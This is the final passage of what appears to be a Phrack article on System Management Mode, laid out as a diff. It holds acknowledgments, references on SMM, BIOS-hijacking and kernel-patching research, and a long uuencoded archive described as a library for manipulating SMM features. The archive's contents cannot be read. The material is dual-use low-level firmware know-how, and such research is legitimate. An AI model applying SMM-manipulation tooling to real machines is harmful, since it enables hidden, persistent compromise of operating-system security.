+Also, with new platforms to BIOS enhancements, like the Extensible Firmware
+Interface, everything that depends on boot patching will be easier [9].
+
+Another important thing to notice is the virtualization resources that 
+exist nowadays and some possibilities of using them in implementations of 
+hardware protected integrity-check systems [10].
+
+------[ 6 - Acknowledgments
+
+A lot of people helped us in the long way these researches that resulted in
+something funny to be published, you all know who you are.
+
+Special tks to twiz and the Phrack Staff for the great review of the 
+article, giving a lot of important insights about how to better structure 
+it and giving a real value to it.
+
+Finally, big tks to Julio Auto for the review of the article drafts.
+
+BSDaemon:
+Conference organizers who invited me to talk about protection
+mechanisms using SMM (yeah, a lot of fun in completely different cultures).
+
+To my girlfriend who waited for me (alone, I suppose) during this travels.
+
+RISE Security (http://www.risesecurity.org) for always keeping me motivated
+studying completely new things.
+
+------[ 7 - References
+
+[1]  - Intel Architecture Reference Manuals
+      http://www.intel.com/products/processor/manuals/index.htm
+
+[2]  - Loic Duflot, Daniel Etiemble, Olivier Grumelard, "Using CPU System
+Management Mode to Circumvent Operating System Security Functions"
+      Proceedings of CanSecWest, 2006
+
+[3]  - Branco, Rodrigo Rubira, "KIDS - Kernel Intrusion Detection System"
+      Hackers to Hackers Conference, 2007
+
+[4]  - LibPCI for Linux
+      ftp://ftp.kernel.org/pub/software/utils/pciutils/
+
+[5]  - Intel 82801 BA-I/O Controler HUB (ICH2) Datasheet
+      http://www.intel.com/design/chipsets/datashts/290687.htm
+
+[6]  - Intel 82845 Memory Controler HUB (MCH) Datasheet
+      http://www.intel.com/design/chipsets/datashts/290725.htm
+
+[7]  - LinuxBIOS
+      http://freshmeat.net/projects/linuxbios
+
+[8]  - Bing, Sun, "BIOS Boot Hijacking By Using Intel ICHx "Top-Block Swap"
+Mode"
+      XFocus Information Security Conference, 2007
+
+[9]  - Heasman, John, "Hacking the Extensible Firmware Interface"
+      Blackhat Las Vegas Briefings, 2007
+
+[10] - Branco, Rodrigo Rubira, "StMichael Project"
+      http://stjude.sf.net
+
+[11] - PCI Specification
+      http://www.pcisig.com
+
+[12] - Shanley, Tom; Anderson, Don; "PCI System Architecture" 
+      Mindshare Inc
+      ISBN 0-201-30974-2 
+      Publisher: Addison Wesley
+
+[13] - PCI Database
+      http://www.pcidatabase.com
+
+[14] - devik & sd; "Linux on-the-fly kernel patching without LKM"
+      Phrack 58
+
+------[ 8 - Sources - Implementation details [brazil_SMM.tgz]
+
+Attached a GPLed library that will help you to manipulate the SMM-related
+features, accompanied by some programs displaying sample usage.
+
+Further updates will be available in the StMichael project website, at:
+        http://stjude.sf.net
+
+
+begin 644 brazil_SMM.tgz
+M'XL(`-M5[D<``^Q;VW+;2)+UZU3L1U3HI:4(FFWY.MU^HB3*XHY$JDG*;CUM
+M@$211!L$."A`,O?K]V1F%5#@Q9[9F-Z(B5C%],@B"EE9>3V9E9P5T7\GZ7]-
+M[NY^?O%G_;S"SX=W[^CW^8=WK\+?_N?%^:L/']Z\???Z_?OW+UZ=O_[PYLT+
+M_>Y/XRCXJ6P9%5J_*&9%E,WSH^M^]/S?]&?6Z#]-9G^.#?SS^G_S[M7Y_^O_
+M_^)G1_^WR=QDUOQK]R`%OW_[UNM[Y_?;-^=P=NC__5L8Q9L/KTG_[]^^>Z%?
+M_6O9./Q3ZS_/R^^M^]'S?].?O_Q%X^?3\$%_Z@_[X]ZMOG^XN!U<:OS7'T[Z
+M2A;@Y[,I;))G^G5'_V>5&7W^RR_G2NG+?+,MDN6JU*>79_CPK[]T^)&^+HS1
+MDWQ1/D>%T==YE<51"0(=/<CF7:4/_[RC%Z/L:YID>E)V]'6R*%?Z.LWSHJ,O
+M<EL2@;N>UJ]>GY^_>GG^YM6YU@^3GM+])U-L<S"66+TQQ3HI2Q/K,M=S<*BC
+M+-9Q8LLBF56ET5@[`S=K>I@8JW2^T.4*;Z;B`#K.Y]7:9.``Z_5\%67+)%OJ
+MI"3R65[J*$WS9Q-W%23$(KHO3+2>I08RT=.5\92L7N2%7H-S;;TPZ+_8V&29
+M"8=E]!4?/D=;O<VK0BT@N3A?TQ.[XO5@GEG`X<JNUA=;\)V5163!7XF]6'\F
+M,T64ZOMJAJV5\V1B-\E*D\6RU;**(-X2JJ&M]/>VHF?*\_SR)9:LB4];81EM
+M6A\'6]!:/BC$`AZMKBS,I4N22*QJLZ8]:]%FDT+XM#G+AW5@VH:C&L/YR082
+MS/@T4;;5.=XI]*;(ET6TUL^KG"A7Y2HO+*2TAAU@I:JLJ`\LG4[RM7&O'3/2
+MUN'F.<P%XIMME1?V;8+`66SUD9,EF2U-%'?/M'[,*SV/,C[L5@LS+'K'L84&
+M\[Q+5O-E93+]#,%N3/25I,%2]9QTZ!%Q5)B%*0HZ#B3@%-@AFU2;`OOCA".0
+M/\R9W;.]4*=125:A5M&3:#BPCL!WQ&7V^-.GSG:*)9N"8G^"&3QA:YTLB+1^
+M3NSJK%-OA;/,3?)$1*IB3J1C:*9@@2T-?*U4_D48+?X,7J4USE);UHC787P:
+M/,Z%2R*2Z<P\"[]>[A_%B#RYKUG^7-.-<Z)IB3+D;%D[TYQ>+<V\%-?AH&=9
+M*YD)9%D8DM2<K,@*>0ACEL0*QDKAB81I,G9UMXE0(L;)I.U7>9235@IRW((/
+M**NZ:BKOM':!2]LT*IGXW!1EA`-CQ08/DUF2)F7BXA!1%HFJ@QH-)=DACISX
+MUWF<+,A\6137>&"^1>M-BD5NQ4%RMIJO=.1%#EFM#+F=PE]EPB?FF*$7!H1X
+M'Z1CO4R<_<$Z$I#*(!R**XT46*[D1IILM2M>QN_NF#->V;*#=6I3"\P+3U5@
+M>:#3@TG4?-@53`)KUMX8D%4H!C%5,1C\*RF45PWYL#ED);![9+'R&3HMS<;^
+MJD_/SS@O2>9L2QUFJ4Y?GT%^\'-G)D%F>EXE$"K)R/+#U"SAYISQ+"=HE_(Z
+MH89!\V=.0ZS&<#_FNI=:2(AT82+2&(=/Q%MW%*)*SH(#B<&S-WJ#=P:G6.#&
+M9^&*#!?8*HMMK0H)IUF.]PO*0EO>DD_72C90Q&"QEV.8^83C,#Y?&]K%I%:2
+MP2:R%H\('3P;Y:*%#2T([#J5@9EG;QQL0#ZGTXXY5))D4=K!'G(D2C(0!%+[
+MFG-ID<?57-C@)$+:A742`83FE%1/6@AH*9>/?L*"355RAA%SN:;'Z;;#FX3A
+MB5@J5X`42-W8"^F>9%DBA?#I77+<T..2\BSLCF(K1Y"G/(EY_YBB8R$G1@+S
+MYD"9$<X9B=#KS$F'2+(X>4KBBIC2^8P#B6Q2XQEX?*8-;'/.WL9Y:-60P6^D
+M(0-0O>VZH`F;('.!FMEX6.+K*"8PH^>IB1R'$($[D+C?K,90L9BF,ZV?'-R@
+M*(^/2>[UNHB!6==CL`WIO_9<SD\Y3BA1DVB2H^`$G29\.5M78FUS00.+G-!>
+M5_V'^B%>QM-I?WPWT;WAE;X<#:\&T\%H.-'7HS'^O'\<##]U]-5@,AT/+A[H
+M$2^\&UT-K@>7/?J`F'_59>1T""HY<V1AXP2"8Y[SXJN+#(0,H3:K(A(-Y=Y-
+M&CE[):-HPLXJ3RFYV&CKH.T:"!12;^)&K*HZ_X@,/4X^#"^Z(O:3>^'O!.C9
+M0'`=Q9BE9I_30G`&XI[C'FSRA(\RB\2;>6=/3:T-\IPV"1\Y>$(TB"Y839Z@
+M,=@74Q'FFP.GT?.OXM,)\X*38UM9Z\3FS+E%66_R@LV`P41'.0;J&H).0/$]
+M-!GK0VZ=FV.*'71^UIA*X9M5M"21G=X@,B(0+"#B3OT";<C@?9Y6!-YIB[PB
+M6P>D=8\SY36C3\+=3PAY]BF4.\_@$!?%,4`!NXG5)\@=)W"4'L+[DP"$W,F5
+M@-4QOV@=DL$D`<\&(8MU.'/X*"&645E5VH1='AD4U+VI1!0M%ZJHLCW1NZ#L
+MD8Z).PZQ,37$482!?!V^H@*PGF<$MQ>\(>F6<P"'T:3DC*CW#$WYG4\1!LV&
+MH%?&50DB%C$W,\#G'+APS@,<GW75%P$XNC:RHB*X3;0L[>+S3GW(.#>2"<Z[
+M`F*B[3]2L'JLYLC\9$,<0^H-P37!YB1C#UDC"U0`8G`^A'G3X%]%HMDD\RJO
+M;"J[(^9P+(?MXI,-.3H2#`[!&,$Q&:Y2C:>YR.,.,4^C9`VI@&F?^3_JK\9L
+MR"7(`ARZ4_*:]1F+\`^5QZU(*)4?'3Z:69-A%\IE.%M-6M$:!I%-?1@`@;;H
+M8`A\%!_8W#XJ2G-H5W!;LQJJJK4DE0Z#5X=C$&I76POG2)U=BS/[<DUV$H"W
+M=50BAQ/SC8LP=.8:'@7XBY+N-U^9>]#,EO.ZL1R'[YBBG*HX;#`^8KK(IB2R
+M847%>7$M[!X-Q1V72\5.0Z#)H;T="%V`UP=2R<0=[EQ%,_CM`;N$:0!PKXT1
+M(Y%36!/D\5\5]Y*BLZ8(F$>5E0JBQHR+))7T.8=L6;`X([FW,SFF82FNLD_[
+M&I/E+3%'*/@(%%.UY0Q/5G6%C]D>'VR;)(":;"`O",=YEBMM$=.)S#.2,S]E
+M`%:4=5KGSZRD.CK73@ATBF4:_![#[GQ!15`+42%&1&Z7B*3@[9E2%'MC4L0U
+M%3*@8TC`IWXY_OS,0_=:]#[19[`KQI5`M;'T9K@ZH/94$5$:0IQQAT>@18`-
+M:D(1)=DH/Z2F+:54'X7)(\CT^/6`((/$)',,48^IB)%I"XH67!B"NX2"?$%*
+M`5`B@Q9[RK*\0G2A)J!+PNP4K8BG#T:\B`FX#X[7/J>$:5&_=#P"J^W#>8'P
+M4;]PUC0LN+O&'A_`>K%X+VU6%U/8=1B71DV:^OQ%Y#07N[E^2LSS3DQD*@W"
+M.^U_FQL.5[]2@FVE[-*:=.%[CEX'X(U)4*[CE%Y;@@A?N@192^0="6*M".1/
+MLX\0_EXEA;1@A.(.L>X9D+OOF_#:M305N"?GLDEMK[QGXQY<C*J$L`">1R@#
+MM36N\<("HG*27Q$P=-0U.YR7J/<P(SXBFV>@QJU<@D8%(\0&=]!B:^!]9&>T
+M@75X;PT9/U$=5I(GA#XHFB7$PR[:H3X6]ZJ;<^9(;37[[$H[`8G['9'=V9J:
+MSE59OZ!VC,Y&ZT`J>)M##]>8$F*D-$EL*ZFHW:3"@34$G"YI"0U?%+JW?!12
+M;0E(`[AIATB=)R#`@V'4$-^H)>Y4KTBUA=O&@\R*LX6T0_`!%Y]RK,(LHR)&
+M,F#]XR7]3&E:FF-3O-@)K@F(4^Z_EW7`='+B9$3`*.C_,5"UI0I;1U@FU5U!
+M-QI``<RL-`*P[J.&EE9<.#1;<7FCS#=32/GK&V?2&Z(61GI0V$$!E1>`<REU
+M,WPY90]"`9QYD%%ID<CESIHB7;1<DI0\65?SR#E(*H<(J5VLQ0&2/_P.$CFC
+MOR/]E*<5-?47J'IMF1<HK%Q,;\XGV+>)0K/"Q[^`.PF;;--4I1S,<F^^#]5W
+MC[#+/960DDP]_'E]1CDJG_U!/17?`X?VYE7)\880V8'\JR;>X\Z9A]>:4=0Q
+M$(5@0"TSYU/2TH`$&OS4FR,G;PBNP'YK;=!GJ>%<5TA/F1/A&IX!!/62DCDQ
+M*0"J*4(ZSN>]UP9-A>\@0<DU[>.P@IWRYJ"6KZ,B@?U7OC'4-`DIZ0@:^P@1
+M=FI$MG^RJ/8GAMP=_12EB9"#S%)$YY+[;W*NK8D*OJAIR@H&2!P0MAT'R!V"
+MRN@Z2QK0F5SH,3!R-UR^0J#L9PJ/M9W@0GOM<!86V3.%78D'.7I7.2T],/"3
+M!/R/Z>"X_.4D_PL=S(]95Y*1""12!#4KXU.7F%E!DOMW[J&.')DP"G?/HA2\
+M9!+/'(QQU[;2'EAP^S`C)$J1$F7;7KO#MQ$HZ='[-7\AUOJQ\_)Y:X`:U59'
+M93GD4DA[1T^JF<\.,Y$^H`LAE]8%V:()*M(1$U[X6E#4L:XS)RVBRSC7J6U7
+M9I`GWXA><]$0,BT=N=KU97?%N\N6_CYFCR]\CDTJJI62IFI!99=6EBN3R-I\
+MGOB&&%P@(L,WBR1+I-=*=99;+W&X2#9RHTP)6_G\1<PEKD_&L(<ZY&D:A<"A
+M.1%.>0/%/Y'0"=LINS&L<>/!;&?O/*&[\!4?90W7CZ/;/+X<K%L]-:@-7SNE
+MLEW:A8XR9#3C"D21GLX:3UA'?S`"6,.B&9V>R@F)XZ\P8Y,*-+$4QL_<"15R
+M5"%%J]W:$M"-FTP4>-OGITH)4JTRQBW,<[V5<K`]<A[*C>:V])#D%WMH(:!.
+M$"OP`+JM<7TR-G3PIT"=MW8#&8R.(W<5S=;`;6J':OU;FN`Z0C-QN4-@S_H\
+MW&8PRL3PH&*<;]4A6-F*DG1)0?BX6JZ"V)ZX&W-I<JXW*)J"H9*`R$Z[*!`&
+MW1IH_;;!#&1%T@B2=@WJ/VZB"WX-44L+2RBQ5+)>\VU#C5PNH%RJ]^$\@"IT
+MFTD-)EC%IE2,<9X9#>9'MS^^.\5/NE<2&^2[HJBB-%"Z9$99)"%%MNX]#["E
+M:C_T`B8(S9="=7"5GA4+PU^SLWHI0WB$%O0$Z_LW/[F0%,WX3<T8NPZKB<H;
+MBL6>`=2#=-&%_RVJ5")+FD0H'AGNO1/5^?(NK#;))#?E3@UF$VI*^LMI-ATW
+M;L'!MCX^@6(V<;K#7%*)+VW;]E6N:^DAA!]1#/6#2KM[]R&S-U3Q1KXJ*_B2
+M;I7,DE):]6GT7-_>NT)Q_SQ"!\DEI[OIV58NQKA?T0+8.\W[4]=@/-ID/Y/F
+M#ETXSFNKD?TCU]1MZ;AD`$O7U-1Q]&-&_\S%GG!<LZ]VA+A3XKA1A_==N4<I
+MD[5Q`.5[4/\')R[#H88=!W+&3R6R]T8?TI2_2'9/9%)$G+C=2PPN^#U?\&Z.
+M125=9YLCEZ%^A,*%IP29P74N%U7!]U6M@1-7@S5-]9]T76RZX.H"`-LU1+'B
+M*ZZN:GN2FU`1E(3*%O\_)STU'NBNE()PS.?8J<@^=/5@(8F=VREPT?IF@)(`
+MJO8_JGC)O3P!*4%U*G?."DB4,H[QBQ9.G_[^@/HU^E1NF]>)FRUT]]5PU\K8
+MLXX*K)#!,,N1#8%LY]3-O]"AA"L@/T8D*)?]QDVD/O-YFD;]X":E0_KU%CL^
+MTI'K-O%E2A?4_*1]Z]1X_%T9N7#S3_1ZV-//'1JW-+4#\[+)NDKAID8NB^0"
+M`SEDZ7!E$_55>&T33.L9Z)+;[\%K+O7O*9&@MS?,([[GKOWW)Y,BK]UZ>B:O
+M4@%R,B.JBWR+,F'[DD<*`N<.<(+?!<%/8&_.8SAY?<'FKEABI(4YC6APV[[^
+M"V4DHPJ<0X[(D8<+"S?R2<8`KKQX9Q`2@6=I1(5YCI?-*!C2C7I!2:MN![&2
+MO\.^8+C@TF>O(85_KDQ*2%J*89JDR\0I#:,\2;U,@IQQ7J41(FU2S*NUY:@M
+M$6X6I4T(-R'Y8!)525/2WZ?X1<&UQ,[DJAN@S,2$5+@MW:`.6BVW355P!#O0
+M<X-F*I>?^2_Q^F#ZQ#9C%=3HAZEN7?>,VW5^4,_UZJ1QD)1;=QNDN)LM*S^V
+M-U]%KJ*ATP4<^EL^-TE#AUX6CF+IQC";`KNE8@']G;J_JA(R?8HDDN(W,I[A
+MK7_#+7D2F-9WK$>38WTSDJ.6--<!MY:HX[:I2_%GNL(O^`Z2IOOV6#*Q\M;.
+MH<O5)#R-Z.)YGDG#VW+@Y+F6>5"S10!+_-)'UT2M-O5U+P]1_1SGF2@@1O:)
+M>;*41ZVT7;'-$!CD]-YJ%M2\>OZ:8.28E/&3>E["A4&7"240K_*$,>%TQVM"
+M,^61.&*4=J'N/@\X/;LB<08QF"=Q@)G9SU:256VY%YZYB/AKUU^N[?8I?G93
+MKSL1*['!^`1='_CA4"Z,"@I:KCHE6VFL?[9M;K;".EUB=`-']F:)*"IRZ65;
+M?.R7`1S1HSB6O@,9`=2]-+1\L^(;]-81@Z$7Y#6YBU,2B.NC=&0T,RK;K[:^
+M#B#MG(Q!P!JE@&H$(:&CLFX#$U-*S.1R:AY)=@UB,4!^#@^F*Q++`3U@$7X.
+MJ_0-1G?].,OCO2D#!B^_='D2YN@H.DG*3U\4YBGAVUM1.0TU/\GW,JQRNC\R
+MDBX8@%`LN1-^XW@3.EM(@YV'#!,9/J'@#M[M)BEX;-VWF2PYKGM#OAY!'`)W
+MTN@"7H@-3"SE$"\#1[Q%/4$IUQPP1!Z!9'#MB)&JJ+]*_492(71<X=`4%_V*
+MK%K/3-',A_K:F+LY"Z[6=];N%1(2*H.!.I=I3RAXTZ!6X2F<=)HJCE.VG]%H
+MFN=!`[4-J/V0F+\A]$SEA9\::&WE%=R,Z9$YJ`/FL'?VYD)#A+`])(*=2[)M
+M/<.2>YSO7Z':]#`WA[Z3(:-+K[H>//H9U,`[&"OLS9_P+)S$WW`*U;K[NY8'
+M[X!JL32^(R87,^W\H-P,/<'WII)VT+#.`O5]9!CF?B#YG>V.^>M'_@I'OC;D
+M9%9Q/JB;C+:>>'9?TZ`DQG+G'@8\#R8?-[S0R/@RCU+V;O:]XLF;G<`"A)Q*
+MQGGQ?M,$X(_\-WQ:WYL12ODZKVMV^N:/S#;$"#`NC=2O+"6>I-OFJT[#D?[2
+M&X][P^DCZ_^\JR_ZE[V'25]/;_KZ?CSZ-.[=Z<'$3\5>Z>MQOZ]'U_KRIC?^
+MU._0NG&?5H2T:$8V((!5(_Z[__NT/YSJ^_[X;C"=@MK%H^[=WX-X[^*VKV][
+M7R#-_N^7_?NI_G+3'ZH1D?\R`#^3:8]>&`SUE_%@.AA^8H(TB#L>?+J9ZIO1
+M[55_S-.Z/V-W?E'?]\;307^BP,?GP57[4">]"=@^T5\&TYO1P[1FG@[7&S[J
+MOPV&5QW='S"A_N_WX_X$YU>@/;@#QWT\'`PO;Q^N>!#X`A2&HRGDA).!S^F(
+M1>/7>NI@!O3577\,^0VGO8O![0!;TN3P]6`ZQ!8\7]P3SB\?;GLXQ,/X?C3I
+M4_^&1`@B$/AX,/F;[DV4$^QO#[V:$*0+&G>]X24K:D>1=%S].'J@K(%SWU[1
+M`N47D*#Z^JI_W;^<#CY#O5B);28/=WTG[\F4!71[JX?]2_#;&S_J27_\>7!)
+M<E#C_GUO`/'3C/1X3%1&0XDMK[ND/%A)_S/9P,/PEDX[[O_V@/,<L`2BT?L$
+M:R-A!GI77P;8G#2TJ_P.OX('C?(?848C?==[E,'L1V<>8+.>W&Y;!8RBL<[>
+MQ8AD<`%^!LP6&"&!D(JN>G>]3_U)1]5&P%N[8?*.GMSW+P?T#SR'Z4'7MR(5
+M>-%O#Z1%?."(Z![424<C.W0J(Q\D6QMZ&\'>NWYYVNR]8W]D%[>C"1D;-IGV
+M-'.,WQ=]6CWN#R$O=J?>Y>7#&*Y%*^@-<#-Y@+,-AJP41>=E;QZ,K[P_L9SU
+M=6]P^S#>LS'L/(((B23;6JT0;V23LP[;@!Y<8ZO+&Z<]W?+:1WT#55STL:QW
+M]7E`D4?V4?"%R<#)9.0H.#ER8.-OG^)\O/[``#_-_M.2&QF3ZG$U*AW6*>=_
+M?/A(`7<(L..RG"4+=IDQ1F)-\PV2LT-#S1QE\/TV-Z7GDN62O_]A2X4:1-ID
+ME:WSCY1VKN*FDH&:"=R37E&)(:!'YMPY!R6E:N<"R8'U%W9H,*G5W`R^"EI?
+M%OOVH?]&G&_)EF7DKIP::%0/\_Y/>\_:U$:.[7QU5^4_*,XFL5D_,:]`DKT$
+M/`EW(%"8S.S>.UM>8[>)-[:;<ML!9B?WM]_SD-12OVP#(9F:5LT$Z)9TCHZD
+M(YUGJYLCJR&`(B0*^9T^#@TQUJU'JC+Y]Y&-"=](&PM:!G6P*$>@L,\@7!`^
+MNS?29@67=U]>TP)G8W+AP:ZH#_\C*5+H8J>L_72'S^OK0![N\V.IMA*7'DE`
+MY(I#GGPTT!D;'2BZ$<]U())T@GR)]*3VRF/`(,!SN*RAA8J[/@?9HR_@R.^P
+M,U&'5@%YA;^FONSXZI?HB?`:(%`7>.K3I><UPR6YU`@@LN9[1T<W6K/,M]\@
+M.(P]**?Q[IYQD<:!9[9OW1NUMU[R12D(I.#(<@7D,#"&42\%VTNZ&+T_5^()
+M8)IBI1CV$;UZII+.ZM(%VPJFL\3N(B#0J,,=F9`ZX'=T!(8T%9)Z=T@>@\JE
+M$R[:V$7XG`;B+G!,MUQ:)XX.,$H0Y&BJ*(H7Y2Q?#AT5Z^:Z#API+#^1Y(ZE
+M>X1AQ@QHN8/R+*SUM"LPM0^'^9=N']#O.!B52#H"TTD$]6C,@LFW@.,L\;KL
+MHJ_:Q!O#B#@@$&[_P/D&0U9\6OX:EG]J2?%'%5;204).M$OO</")N:E#[H]0
+MC[B3SS$5EJ<K;"%7^E.]'<,5^S/?[=4"WWA1"NUGW,["WLN1UEV0)60$Z>Z;
+MUO$AW#T._V'>FW=H3<CE(*8WL,#_1;&K5\\KP;8(\X/@[*'#P!TB'*1KB#U0
+M#S*22FN/E$"V8X+K/C<1J;#CRL>;2Q3SR,H5^'PK_`@'W5JN7Q5W:\666%)D
+M8O39<9\,*](6$L`CP[&/.LX;5&^@Q8WLP2"ED7[!"'V*14U&,K&>GO;_N>N,
+M/.BRW`4,/I%:8^2.9T`P=^27R\C)293V9P.VZ^J(?QE#(@=+KGD8C$Q57.`H
+MW@TT*ZBX=^V,+%N/W$E1<"3WQ/%1@!^RI6/,_NQH:L8PND`U%P3@Y(,X%77_
+M&/2=,0;*^QRO^4[ZJ7?0B^)R"(<&^5!1&URF'&WQ#^_&Z]V,7;7'\4P\O]&`
+MV#LH0(!V"-Y0)`N6P*&C?QGK_#F:Q\AC$':CSP&]OI!^*N@&XQ>U2@V`_3=B
+M(]YUNI_<";'`E^Q(@J'?L$K.;F"G>>/7)5&'N]ID,*34)'AIX1<ES-?A#U2$
+MU\^P@J1>-X'M:BV+M!L%&@Y</^;\DF[#,>)@=<H!;62;F*RH@R;:B8<6:F0V
+ME%A"JV@<Y1U.\9G(]OFL(N,C8P*<E7R[3(B&7MW77BF.[%RID)@I7"DG4174
+MW8,+G8J?B<EUX<3GNHBJ-K]U:INL+%!"^9_@?_BU\O%>81CYG^+R?ZTW-BG_
+MU\;Z)OR^UOBA5E_;W%Q[Z/Q/?\[\7]451^!_2M08NGV^F:S6:EOR.:7%@(O(
+MWL?.#$X<][,H[-?&\*P&5_&7'7Q7Z>IW*V.O=;)[M"(F5]./Y0X(7>ZXTG-?
+MZ\Y.O1Z<"YXXG9T/)AWQAN@J"F]:^QUWA+?[EQ-9(^AJ`&>!VYVA5;3B32Y>
+M!TC?2>:1?>CL)K>2>F0GZ3KS>7*/["0D_2PD^2228D'I1[:6,M`MY!_9@2$%
+M+2,!R=81.6@Y&4@3X=9RD&ROYW5I24AVD)CRK"0V-M?%$=QKQ"Y*'7N=$4C_
+MO0N7Y!\0?QHO2K(/D'_DD*J.\V30AU79%\"8VS]^>$^ZT5;[G?.$G*;=R'-H
+MP#[*XN5E=U"%_RL?7QL/_1N_.O#@&0"JKL#*&!:*)91]X*<@B`X\_MP9SN#&
+M$X1%'.R]6R_AOXTCK*2@'Y[LO6GO'Q_M'KP7A=IUK6B_>?.A11)\],U^\V?Y
+MIMX/O<+11!JUC@[:S??MXQ]_;#7/Z&4C]+9UUE*O\>U:$<=Q/F!)C9NS`Q=<
+M3XLX!GA]=KQ_3-=5JD?*'9Y88XB[)T=["/K-P9D:2UV\?"G6BT1`:"G61;DL
+M?+C%PP]J3VHO:-C>>W_&&XTC6`&-)V;?;]\<MN7(L'OJN\A\4O5=,_J^&'KG
+MZ+0^)G\<U9EC#Y1,)\'$;6VLOZWB/S_COR?T3[.ZM5X#[F(.O&CB==I$[7QS
+MOR9'K0>]&=!\OWU\$I#%J+-AUMD[;`553.(9=0[W?HJKLQ;4>=NF<34CD]`(
+MZNRUW^RVFNU6\^UJ0$RLLUI$6F+<#-G_C6$&3>IVD_H"36J1*0LUP:V+._=@
+MJU$S5BJ,PUBG+VH$"JKPOD)WX.3*/:Z\`5L13HX+$!M`!(1V`AJ"4-YW=-.C
+MYA%LL8.]ILA7>^[GZL@=Y8.7NR<GS?W=T^9NZ^!_FJ*P5GNQ490CT(ICU,,.
+M?M/:Z!$(%<!'"274&70HNN'\!A<[(&`7<_/@'F@?'/.LG:\&M!IX*B<)PE"[
+M9>)>H'?0A"FH"8%4QPXZ>&>T-O[!^];9[OX^6MI$05;\JZA=;U'%^\)DMD6*
+MB;8_@F.@`"?KK`O"8'?0!N*N"'J*OX+LM$5[JCWUVMB@N./,ZALHXK<O1^@7
+M7$`_>N.I/QJTW7%[X%W&O?&A)^,5>H?)[4^O+\Z'!:P>=`*5L`X<_O,K&1UY
+MXW;G<C2_KZ1Z5!%N%V-)((DO/NT./=^-/AYZW4_V4XHP8/Z)U`,X[>YXJM\B
+ME\,#$GDV_JQ7!'G@A1L(>6[2AL#9#9V0^/9;W[N_EQ*2_XXZGUPTD=PKC/3\
+MOR@`KLG\OYMKZ[4UE/]JF/\YR__[]<L3<>IR,*J'=VHY_9@Y8/R<,E=2GD1/
+M*D\_N2K,#N0&C`C!L#(I+OE3YXG6=#GH*;WMY"ZZ75'^!>N7?W$G$P_C<DC#
+M`(\]];OOB3)EG^TYN?]RX3RS?XC\?@@9!)J(#'($A48^U*$C&P!FW4M1[AL8
+M5&?^!+>`XZ#'YAAJ3$96#?F"6_,[U:8:5,IQ2D2L^8?@,?'ZG^Z]PDC7_]0W
+M&FL;@?ZGL<'ZGXU,__,0)57_(\1]:X!RF?(G4_YDRI]%E3_"5.;XTQZI;>;H
+M=_)*AY^_@\SB_,?)&=5EZ/7*)?RR8[WIX7[7'<'__<YL.-W1Z?VAXRZEL9ZV
+M2:,$U_@<$+'P.(!>%``LAUV+5PQM"*)!H1ATDL.GF!^@@+7@12X7`2G;HM@$
+M3ZEB2=3T?]CH"X?:1IJ^TD]V'`W3PEIVCK)]&P7>0J2/DB6J%XV.*"-5OY#?
+MXPY9L:85-=L@ISZMK5W_BM[F%LPBDZI@:V*>V?,DD'(2@%5Q6SSM49\%>R#/
+M;,U.4?Q-U,4VT4=C#$`-U4X*Q*!6,KB@3C(LI2)*!24KI4&259(!*3U3*B!9
+M*0V0K)($R%)6I<`RZR6#,VLE00RKOE*`AJHFPPU5G`^ZOCCH^J*@ZXN!GKLY
+M0E47`9V\02;N=#89AQG;%R=6T2.6XJ505E`'3F<#O`;^"=W729^[BG\#A/-.
+M;P*_.K$\,\HKG9SN,)9)&AK\DE;:E[22OA3HY+$WQ";"#C4`X+37:T`KU+I@
+M%-UP,)Y=Z_0E/4R,-_&KF"BI>M69=C_VO(OJ8.OZNCWM>B`3KE0)P.H<`'5$
+M!*D`]0H%:L`JV]]%@?![_5IL%HNDKF9"06<DD\TN)5D00=)+L0,L>P&AUB@G
+M)Y>);,QI6$V'TVIKP4IB.KI$K@T_`#-C(2"^03UXAS7^:ILT=@+80=4(!I8Z
+MT$1!OIB/@ZQH(1%83D)8R,J$QGS-(^'36%6/@@/?NQP6&G2@F:\`!30^V6I$
+M//*L2L]"-A*^+L#T`0)R4N#VZ9.%!->/0K\6G/C8@.Q;5L>_ASHNV0K-W`*X
+M+HAL"-N!@:S"MHX`#71#33@:%5U5(RW+W!0&"PA!JROMWSPF![2)R\[5`Y_:
+M&:WDG,[1%#_LI`*6O,9Z)3-U'#WA<4<G\IGXOV\XDU,4I))F)7%"9:QZI%U-
+M36;0,KK4K9;F<K_E"IAK!OA*:\`PK.H%`-"[=]C21I?WLPHB.)I(+KJ35?V'
+MVL;??!9ON8T?9O:6W+7+;=6OL3_#9K5;2N=\G8R(XPO=(IU`XIXO:3NY!:7G
+ML-0L>(&ER9"2S(:`:G&*Q6]Z25S%[CR8?/IV#7\7BKY,%L!C^V/:R")RQN_F
+MF&AYARFV*,GDNI]'LC2:+46T-#:':D6Y_,D_1>T#!IP(+(D+VALAWI2<;868
+M:8TL5:_?O]-R!=;\;==K5Z=MDF>G'M&M%F\LGY>KU)_1&L+POAN!M3%M2`JT
+MN2=":'ZLP^&V["JR.^(<*NYO;Y3H4V;?Z3[)!;A!L\B>!GHB82B=4)^_%@9_
+MRFL(K,3'*?J]HA!WX_&Z(XD)93B;3BA0=S96>"$F=]F9!I3<K0F)3?FV(^DC
+MOU8@-QUC&Y`MF6C64G5X!RC%JW&7XGPI,J&9>AAS`4KQ"<(%KB^O>*,\1[^N
+M?K]D^'H5L9-O;67]?HMA_\<T3-Y@>L_&_Q_F^O]L;*ZNR>^_KS4VZ^C_TUA;
+M?7#[_Y_3_P=WYZP_A.TGIU_\FSZCJCZ&HKX^X8W%(>ER5ZKBD?,HQBQI/IN-
+M!_`X]!">#`?GD8>8>B;\\,:O8N!FZ'$?-OXPIFH$O#N9C/G9HY`[K.$+BR_Q
+M,R`3^HSP1'P$AC1T)__[SQ*(KCW]UP[60T=QZ16+]GC8+:HZT..1T_%'HO!(
+MFP?RE5YGVOEUG#<?82KH^D;H(;IS#U57)ER[GOV7K+)M/Y4_T8L51/R1]UG\
+M!5VA2N*IVT'K(KY$5TAWJO(-NO0Q/U=9,W`@X=ZP&VP/O73];62M_9KLBWI3
+M/K-H"`=@!>6Y+A)[^TOM&D[\IX12`CP"U_,U'%5PJ;;@/*O%=C[Q1Y$69M/6
+MU6`*4O9Y!X[<J1>BP2,G<&#.![.PG38-E2FLGIA);JS2PZ)<.(_0JG\PIC4#
+MMW+CB]7"[Z!K0O/@1-J$5?JZ*STGF",+UAO3EGKJS\:4=K!"?]&B5(_H<"6%
+M@DJHAVE!9:ASN2SS*9)O.F=NQ[3AE]Z8>@INO0HV)8Q#K)%`!`ZHSI^6173H
